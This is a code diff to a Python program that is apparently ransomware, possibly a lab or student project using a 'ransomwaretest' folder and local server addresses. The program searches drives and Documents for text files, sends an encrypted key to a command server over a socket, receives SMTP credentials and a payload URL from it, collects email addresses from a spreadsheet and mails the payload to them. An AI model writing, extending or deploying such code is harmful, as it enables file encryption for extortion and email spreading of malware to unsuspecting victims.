@@ -68,9 +68,29 @@ def findRootDirsWindows():
     roots = drives.split('\000')[:-1]
     return roots
 
+
+def findTxtFileInDocumentsAndSaveThemTo(file_name):
+    documents_path = os.path.join(os.path.expanduser("~"), "Documents") + "\\ransomwaretest"
+    print(documents_path)
+    if not os.path.exists(documents_path):
+        os.makedirs(documents_path)
+    txtFileCounter = 0
+    for root, dirs, files in os.walk(documents_path):
+        for file in files:
+            if file.endswith(".txt"):
+                if file == file_name:
+                    continue
+                file_path = os.path.join(root, file)
+                txtFileCounter += 1
+                print("Files Found: ", txtFileCounter, end='\r')
+                # Write file_path to a .txt file
+                with open(file_name, "a") as f:
+                    f.write(file_path + "\n")
+
 def findTxtFileAndSaveThemTo(file_name):
     """Find all text files in the system and write their paths to a .txt file"""
     root_dirs = findRootDirsWindows()
+    
     txtFileCounter = 0
     for root_dir in root_dirs:
         for root, dirs, files in os.walk(root_dir):
@@ -210,7 +230,8 @@ def decrypt_with_RSA(ciphertext, private_key):
 #     return base64.b64encode(ciphertext_bytes)
 
 def encrypt_ascii_key_with_server_RSA_and_send_to_server(ascii_key):
-    SERVER_IP = '10.0.2.2'
+    # SERVER_IP = '10.0.2.2'
+    SERVER_IP = '127.0.0.1'
     SERVER_PORT = 5678
     with socket.socket(socket.AF_INET , socket.SOCK_STREAM) as s:
         s.connect((SERVER_IP, SERVER_PORT))
@@ -225,7 +246,7 @@ def encrypt_ascii_key_with_server_RSA_and_send_to_server(ascii_key):
         credentials['smtp_email'] = data.split("\n")[0]
         credentials['smtp_password'] = data.split("\n")[1]
         payload_URL = data.split("\n")[2]
-    return encoded_encrypted_msg, credentials, payload_URL
+    return encoded_encrypted_msg,exported_public_key, credentials, payload_URL
 
 def get_emails_from_csv():
     url = "https://docs.google.com/spreadsheets/d/1Wcb2hzqL56QorxwBFW96QWSuyYv_x9VwiFH1nMqJCHA/gviz/tq?tqx=out:csv"
@@ -274,4 +295,12 @@ def send_to_emails(emails, credentials,  payload_url):
 
 
     server.quit()
-    
+
+def get_ascii_key_from_server():
+    SERVER_IP = '127.0.0.1'
+    SERVER_PORT = 5678
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        s.connect((SERVER_IP, SERVER_PORT))
+        data = s.recv(1024)
+        print(f'Received response: {data.decode()}')
+        return data.decode()
